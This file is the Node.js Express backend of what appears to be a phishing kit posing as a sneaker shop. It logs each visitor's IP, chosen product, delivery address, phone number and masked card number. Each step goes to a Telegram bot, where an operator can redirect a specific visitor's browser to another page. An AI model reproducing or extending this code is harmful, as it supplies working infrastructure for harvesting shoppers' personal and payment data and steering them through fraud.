import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import bodyParser from 'body-parser';
import cors from 'cors';
import fetch from 'node-fetch';
import { v4 as uuidv4 } from 'uuid';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID manquant.');

const sessions = {};

async function sendTelegramNotif(data){
  if(!BOT_TOKEN || !CHAT_ID) return;
  let msg = `🆕 <b>Nouvelle interaction</b>\n`;
  msg += `🆔 Session: ${data.sessionId}\n`;
  msg += `🌐 IP: ${data.ip}\n`;
  if(data.page) msg += `📄 Page: ${data.page}\n`;
  if(data.pair) msg += `👟 Paire: ${data.pair}\n`;
  if(data.delivery){
    msg += `📦 Livraison: ${data.delivery.adresse}, Tel: ${data.delivery.telephone}\n`;
  }
  if(data.card){
    msg += `💳 Carte: ${data.card.panMasked}\n`;
  }
  msg += `🕓 ${new Date().toLocaleString()}`;

  const keyboard = {
    inline_keyboard: [
      [{ text:'➡️ Aller à la page suivante', callback_data:`next|${data.sessionId}|/product.html` }]
    ]
  };

  await fetch(`${TELEGRAM_API}/sendMessage`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode:'HTML', reply_markup:keyboard })
  });
}

app.post('/api/visit', (req,res)=>{
  const sid = uuidv4();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  sessions[sid] = { data:{ sessionId:sid, ip, page:'Accueil' }, redirect:null };
  sendTelegramNotif(sessions[sid].data);
  res.json({ sessionId:sid });
});

app.post('/api/buy', (req,res)=>{
  const { sessionId, pair } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.pair = pair;
  sessions[sessionId].data.page = 'Produit';
  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok:true });
});

app.post('/api/delivery', (req,res)=>{
  const { sessionId, adresse, telephone } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.delivery = { adresse, telephone };
  sessions[sessionId].data.page = 'Livraison';
  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok:true });
});

app.post('/api/payment', (req,res)=>{
  const { sessionId, cardNumber } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.card = { panMasked:'**** **** **** '+cardNumber.slice(-4) };
  sessions[sessionId].data.page = 'Paiement';
  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok:true });
});

app.get('/api/status', (req,res)=>{
  const { sessionId } = req.query;
  if(!sessions[sessionId]) return res.json({});
  const redirect = sessions[sessionId].redirect || null;
  res.json({ redirect });
});

app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
  const body = req.body;
  if(body.callback_query){
    const cb = body.callback_query;
    const [action,sid,url] = cb.data.split('|');
    if(action==='next' && sessions[sid]){
      sessions[sid].redirect = url;
    }
    await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ callback_query_id: cb.id, text:'Action prise' })
    });
  }
  res.sendStatus(200);
});

app.get('/', (_,res)=>res.sendFile(path.join(__dirname,'public','index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log(`✅ Serveur prêt sur ${PORT}`));
